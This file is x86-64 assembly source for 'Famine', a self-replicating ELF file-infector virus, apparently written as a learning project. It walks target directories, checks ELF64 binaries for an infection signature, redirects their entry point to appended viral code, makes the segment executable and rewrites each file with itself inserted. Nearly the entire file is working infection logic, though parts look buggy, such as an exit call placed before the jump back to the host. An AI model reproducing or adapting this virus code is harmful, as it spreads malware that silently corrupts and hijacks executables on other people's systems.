	[BITS 64]

	%define SYS_WRITE 	1
	%define SYS_OPEN 	2
	%define SYS_CLOSE 	3
	%define SYS_LSEEK 	8
	%define SYS_MMAP 	9
	%define SYS_MUNMAP 	11
	%define SYS_UNLINK	87
	%define SYS_GETDENTS64	217
	global famine64_func:function
	global famine64_size:data

	section .text

famine64_func:
	push 	rdi
	push 	rsi
	push 	rdx
	push 	rax
	push 	rbx
	sub 	rsp, 8

	lea 	rdi, [rel dir_one]
	call 	find_files
	jmp 	famine64_end
	lea 	rdi, [rel dir_two]
	call 	find_files
	jmp 	famine64_end

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                      void find_files(char *dir_path)                       ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_files:
	push 	rbp
	push	rbx
	sub 	rsp, 1044	; char *dirpath, int fd   , int ret   , char b[1024]
						; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]
	xor 	eax, eax
	mov 	QWORD [rsp], rdi 		; store dir_path
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(dir_path, 0, 0)                                         ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rdx, 0
	mov 	rsi, 0
	mov 	rdi, QWORD [rsp]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			 	; test if < 0
	jl	 	find_files_end
	mov 	DWORD [rsp + 8], eax  	; store directory fd
loop_file:
	xor 	eax, eax
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_getdents(fd, struct linux_dirent64 *dirp, count)             ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	lea 	rsi, [rsp + 16]
	mov 	rdx, 1024
	mov 	rax, SYS_GETDENTS64
	syscall
	test	eax, eax 	 			; test if <= 0
	jle 	loop_end
	mov 	DWORD [rsp + 12], eax  	; store getdents64() return value:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Return a number of bytes between 0 and 1024 (i defined it)            ;;
	;; In C, we would cast those bytes in struct linux_dirent64 * (see doc.) ;;
	;; to retreive directory files name                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	ebx, ebx 	 				; initialize variable off to 0
	jmp 	check_file_type
next_file:
	;; Next struct linux_dirent64*
	movsx	eax, BYTE [rsp + rbp + 32] 	; 32 is the offset of *dirp->d_reclen
	add 	ebx, eax
	cmp 	DWORD [rsp + 12], ebx
	jle 	loop_file
check_file_type:
	;; Loop throught getdents64() buffer / struct linux_dirent64*
	movsx	rbp, ebx
	cmp 	BYTE [rsp + rbp + 34], 8 	; 34 is the offset of *dirp->d_type
	jne 	next_file 	 				; Check if regular file
	mov 	rdi, QWORD [rsp]
	lea 	rsi, [rsp + rbp + 35]		; 35 is the offset of *dirp->d_name
	call	get_dat_elf
	jmp 	next_file
loop_end:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( int fd )                                                   ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	mov 	rax, SYS_CLOSE
	syscall
find_files_end:	
	add 	rsp, 1044
	pop 	rbx
	pop 	rbp
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                  void get_dat_elf(char *dir, char *file)                   ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_dat_elf:
	push	rbp
	push	rbx
	push 	r8
	push 	r9
	push 	r10
	push 	r11
	sub 	rsp, 1024 	 	; char[1024]
 	 	 	 				; [rsp]

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Concatenate directory path name with file name to open it.            ;;
	;; The string will be stored in [rsp]                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	ecx, ecx 	 	; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl 	 		; test directory end of string
	je  	copy_file

copy_dir_bytes:
	mov 	BYTE [rsp + rcx], dl
	inc 	rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne 	copy_dir_bytes

copy_file:	
	add 	rsp, rcx
	xor 	eax, eax 	 	; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je 	open_file
copy_file_bytes:	
	mov 	BYTE [rsp + rax], dl
	inc 	rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne 	copy_file_bytes

open_file:
	mov 	BYTE [rsp + rax], 0 	; NULL byte the end of the string path
	sub 	rsp, rcx 	 	; Return to the start of the string path
	sub 	rsp, 20 	 	; int fd, size_t size, void *data
 	 	 	 				; [rsp] , [rsp + 4]  , [rsp + 12]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_RDWR, 0)                                   ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edx, edx
	mov 	esi, 2
	lea 	rdi, [rsp + 20]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			; test if < 0
	jl	 	get_dat_elf_end
	mov 	DWORD [rsp], eax	; store FD in [rsp]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 1, LSEEK_END)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax
	mov 	esi, 1
	mov 	edx, 2 	 		; LSEEK_END
	mov 	rax, SYS_LSEEK
	syscall
	cmp 	rax, 0 	 		; test if < 0
	mov 	r11, rax 	 	; store rax to r11 (see close_file label)
	jl  	close_file
	mov 	QWORD [rsp + 4], rax	; store SIZE in [rsp + 4]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; void	*mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edi, edi 	 	; NULL
	mov 	rsi, rax 	 	; size
	mov 	edx, 3 	 		; PROT_READ | PROT_WRITE
	mov 	r10d, 2 	 		; MAP_PRIVATE
	mov 	r8d, DWORD [rsp] 	; fd
	xor 	r9, r9 	 		; 0
	mov 	rax, SYS_MMAP
	syscall
	cmp 	rax, 0 	 		; test if == MAP_FAILED (-1)
	mov 	r11, rax 	 	; store rax to r11 (see close_file label)
	jl  	close_file
	mov 	QWORD [rsp + 12], rax	; store ADDRESS in [RSP + 12]

close_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( fd )                                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 	; int fd
	mov 	rax, SYS_CLOSE
	syscall
	cmp 	rax, 0 	 			; if we can't close the file, it will be a problem later
	jl  	munmap_file		 	; so we just end the function.
	cmp 	r11, 0 	 			; lseek, and mmap jump to close_file if a problem occurs
	jl  	munmap_file			; in that case we end the function.
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int unlink(char *pathname)                                            ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	esi, esi
	lea 	rdi, [rsp + 20]
	mov 	rax, SYS_UNLINK
	syscall
	cmp 	rax, 0
	jl  	munmap_file

	mov 	rdx, QWORD [rsp + 12]	; void *data
	mov 	rsi, QWORD [rsp + 4]	; int size
	lea 	rdi, [rsp + 20] 		; char *path
	call	pack_file

munmap_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int munmap(data, size)                                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rsi, QWORD [rsp + 4]	; int size
	mov 	rdi, QWORD [rsp + 12]	; void *data
	mov 	rax, SYS_MUNMAP
	syscall
get_dat_elf_end:
	add 	rsp, 1044
	pop 	r11
	pop 	r10
	pop 	r9
	pop 	r8
	pop 	rbx
	pop 	rbp
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;              void pack_file(char *path, int size, char *data)              ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
pack_file:
	cmp 	BYTE [rdx], 0x7f 		; compare \x7fELF
	jne 	pack_file_end
	cmp 	BYTE [rdx + 1], 'E'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 2], 'L'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 3], 'F'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 4], 2 		; ->e_ident[EI_CLASS] == ELFCLASS64
	jne 	pack_file_end
	cmp 	BYTE [rdx + 5], 0 		; ->e_ident[EI_DATA] != ELFDATANONE
	je  	pack_file_end
	cmp 	BYTE [rdx + 6], 1 		; ->e_ident[EI_VERSION] == EV_CURRENT
	jne 	pack_file_end
	movzx	eax, BYTE [rdx + 16] 	; ->e_type == ET_EXEC || ->e_type == ET_DYN
	sub 	eax, 2
	cmp 	al, 1
	ja  	pack_file_end
	mov 	rax, QWORD [rdx + rsi - 8]
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Get the Program Header Table
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	movzx	ecx, WORD [rdx + 56] 	; ->e_phnum (size: 2)
	mov 	r8, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
	lea 	rax, [rdx + r8] 		; pointer to first segment of Program Header table
	imul	rcx, rcx, 56 			; total size of Program Header table (56: sizeof Elf64_Phdr)
	add 	rcx, r8 	   			; offset to the end of Program Header table
	add 	rcx, rdx 	 			; address of the end of Program Header table
	xor 	r8d, r8d 	 			; Will contain the highest loadable segment
	jmp 	find_highest_pt

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 1. Find the highest memory mapped PT_LOAD segment.
	;;    Register R8 will contain it.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
first_segment:
	mov 	r8, rax 	 		; assign r8 to be the highest loadable segment
next_program:
	add 	rax, 56 	 		; move to next Program Header segment
	cmp 	rcx, rax 	 		; did we passed the last Program Header segment offset ?
	je  	change_section_offset
find_highest_pt:
	cmp 	DWORD [rax], 1 		; is the segment loadable ?
	jne 	next_program 		; go to next segment
	test	r8, r8 	 			; test if r8 is null
	je  	first_segment 		; if it is, we have the first loadable segment,
 	 	 	 					; otherwise we compare with the new loadable segment...
	mov 	r9, QWORD [r8 + 16] 	; ->p_vaddr offset (size: 8)
	cmp 	QWORD [rax + 16], r9	; is segment[i].p_vaddr > highest->p_vaddr ?
	cmova	r8, rax 	 		; Move if above (unsigned)
	jmp 	next_program

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 2. Verify if the file is already infected
	;;    ^o^
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rcx, r8
	call	check_signature
	cmp 	rax, 0
	jne  	pack_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 3. Change the offset of sections higher than the section we infect.
	;;    Infecting the last loadable segment will modify the strtab offset.
	;;    Not doing this will not make the program crash.
	;;    This is only relevant for debugging programs who will not find
	;;    the main and the function of the program.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
change_section_offset:
	test	r8, r8 	 	 	; if no loadable segment has been found, return
	je  	pack_file_end
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Get the Section Header Table
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
	movzx	ecx, WORD [rdx + 60]  	; ->e_shnum (size: 2)
	mov 	r9d, DWORD [rdx + 40] 	; ->e_shoff (size: 4)
	lea 	rax, [rdx + r9] 	 	; pointer to first segment of Section Header table
	imul	rcx, rcx, 64 	 	; total size of Section Header table (64: sizeof Elf64_Shdr)
	add 	rcx, r9 	 	 	; offset to the end of Section Header table
	add 	rcx, rdx 	 		; address of the end of Section Header table
	mov 	r9, QWORD [r8 + 8] 		; store the infected segment offset (+8: ->p_offset)
	add 	r9, QWORD [r8 + 40] 		; add to it its size (+40: ->p_memsz)
find_higher_sections:
	mov 	r10, QWORD [rax + 24]  	; store section offset
	cmp 	r10, r9  	 		; compare if greater than then infected segment offset + size
	jl  	next_section
	add 	r10, [rel famine64_size] 	; If it is, add to the section offset the infected text size
	mov 	QWORD [rax + 24], r10 	; rewrite it to section
next_section:
	add 	rax, 64 	 	 	; move to next section
	cmp 	rcx, rax 	 		; check if we are at the end of it
	jl  	find_higher_sections

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 4. Make things change
	;; 	  a. Change the program entry point
	;;    b. Change the Section Header Table offset
	;;    c. Change the infected Segment flags
	;;    d. Change the infected segment memory size
	;; 
	;;    r8  : Segment we infect.
	;;    rcx : Elf Header.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
modify_program:	
	mov 	rax, QWORD [rdx + 24]  	; First, store the original program entry point
	mov 	r9, QWORD [r8 + 16] 	; store infected segment virtual address (+16: ->p_vaddr)
	add 	r9, QWORD [r8 + 40] 	; add it the segment memory size
 	 	 	 	 					; (value is virtual address of our infected code)
	mov 	QWORD [rdx + 24], r9 	; modify the Program entry point

	mov 	r10, [rel famine64_size] 	; store our program size
	add 	QWORD [rdx + 40], r10 	; modify the Section Header table offset

	mov 	ecx, DWORD [r8 + 4] 		; store infected segment flags (+4: ->p_flags)
	test	cl, 1 	 	 	; see if it is EXECUTABLE
	jne 	modify_next
	or  	ecx, 1 	 	 	; then make it so
	mov 	DWORD [r8 + 4], ecx

modify_next:	
	add 	QWORD [r8 + 40], r10  	; change segment memory size
	mov 	r10, QWORD [r8 + 40]
	mov 	QWORD [r8 + 32], r10  	; change segment file size

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 5. Rewrite the program
	;;    a. Re-open the file in write only mode
	;;    b. Copy the original program until the infected segment offset.
	;;    c. Copy our program at the end of it,
	;;       minus the original program virtual address size.
	;;    d. Copy, in our program, the original virtual address size,
	;;       so we will jump to it later.
	;;    e. Copy the rest of the original program.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	sub 	rsp, 36 	 	  	; int fd, char *data, size_t size, size_t addr, size_t offset
 	 	 	 	 	; [rsp] , [rsp + 4] , [rsp + 12]  , [rsp + 20]  , [rsp + 28]

	mov 	DWORD [rsp], 0 	 	; clean [rsp] to store fd later
	mov 	QWORD [rsp + 4], rdx 	; store the address of the program data
	mov 	QWORD [rsp + 12], rsi  	; store the program size
	mov 	QWORD [rsp + 20], rax 	; store the original program entry point
	mov 	rax, QWORD [r8 + 8] 		; store infected->p_offset
	add 	rax, QWORD [r8 + 40] 	;     + infected->p_filesz
	sub 	rax, [rel famine64_size]	;     - famine64_size
	mov 	QWORD [rsp + 28], rax 

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_WRONLY|O_CREAT, 0755)                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edx, 493			; 0755
	mov 	esi, 65				; O_WRONLY|O_CREAT
	lea 	rdi, [rdi]			; file_path
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 	 	; test if < 0
	jl	 	write_end
	mov 	DWORD [rsp], eax 		; store file fd

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_write(fd, data, somesize)                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax 		  	; file fd
	mov 	rsi, QWORD [rsp + 4] 	; pointer of program data
	mov 	rdx, QWORD [rsp + 28] 	; size until our injection
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	mov 	edi, DWORD [rsp] 	 		; file fd
	mov 	rsi, famine64_func 			; pointer of family64_func
	mov 	edx, [rel famine64_size]			; injection size
	sub 	rdx, 8 	 	 			; less the size of signature + jump_vaddr
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	mov 	edi, DWORD [rsp] 		; file fd
	lea 	rsi, [rsp + 20] 	 	; load the original program entry point address
	mov 	rdx, 8 	 	 			; sizeof jump_vaddr
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	mov 	edi, DWORD [rsp] 		; file fd
	mov 	rsi, [rsp + 4] 	 		; copy the rest of the file
	add 	rsi, QWORD [rsp + 28]
	mov 	rdx, QWORD [rsp + 12]  	; file size
	sub 	rdx, QWORD [rsp + 28]	; minus what we already wrote
	dec 	rdx
	mov 	rax, SYS_WRITE
	syscall
clean_write_end:
	mov 	edi, DWORD [rsp]
	mov 	rax, SYS_CLOSE
	syscall
write_end:	
	add 	rsp, 36
pack_file_end:
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;   void check_signature(char *path, int size, char *data, char *segment)    ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
check_signature:
	mov 	rax, QWORD [rcx + 8] 	; store ->p_offset
	add 	rax, QWORD [rcx + 40]	; add ->p_memsz
	sub		rax, 16					; sub 16 to get signature (if here)
	mov 	rax, QWORD [rdx + rax]	; reach it
	xor 	rax, [rel signature]	; compare
	ret								; return :)
	
famine64_end:	
	pop 	rbx
	pop 	rax
	pop 	rdx
	pop 	rsi
	pop 	rdi
	add 	rsp, 8

	xor 	edi, edi
	mov 	rax, 60
	syscall
	push 	QWORD [rel jump_vaddr]
	ret
	nop
	nop
	nop
	nop
	nop
	nop
famine64_data:
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
	famine64_size dd end_of_file - famine64_func
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	signature dw 0x42CAFE42
	jump_vaddr dq 0x0
end_of_file:
